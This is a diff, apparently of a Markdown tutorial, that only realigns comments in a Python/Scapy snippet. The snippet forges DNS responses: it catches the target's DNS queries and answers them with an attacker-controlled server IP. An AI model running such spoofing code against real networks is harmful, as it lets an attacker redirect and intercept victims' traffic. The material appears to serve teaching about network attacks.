@@ -65,9 +65,9 @@ Now, since all the DNS messages are dropped, we need to provide the target with 
 ```python
 if (pkt[IP].src == g_target_ip and
     pkt.haslayer(DNS) and
-    pkt[DNS].qr == 0 and				# DNS Query
-    pkt[DNS].opcode == 0 and		# DNS Standard Query
-    pkt[DNS].ancount == 0				# Answer Count
+    pkt[DNS].qr == 0 and        # DNS Query
+    pkt[DNS].opcode == 0 and    # DNS Standard Query
+    pkt[DNS].ancount == 0       # Answer Count
     ):
 
   print("Sending spoofed DNS response")
@@ -84,14 +84,14 @@ if (pkt[IP].src == g_target_ip and
           sport=53
           )/ \
         DNS(
-          id=pkt[DNS].id,				# Same as query
-          ancount=1,						# Number of answers
-          qr=1,									# DNS Response
-          ra=1,									# Recursion available
-          qd=(pkt.getlayer(DNS)).qd,		# Query Data
+          id=pkt[DNS].id,       # Same as query
+          ancount=1,            # Number of answers
+          qr=1,                 # DNS Response
+          ra=1,                 # Recursion available
+          qd=(pkt.getlayer(DNS)).qd,  # Query Data
           an=DNSRR(
-            rrname=pkt[DNSQR].qname,	# Queried host name
-            rdata=g_server_ip,				# IP address of queried host name
+            rrname=pkt[DNSQR].qname,  # Queried host name
+            rdata=g_server_ip,        # IP address of queried host name
             ttl = 10
             )
           )
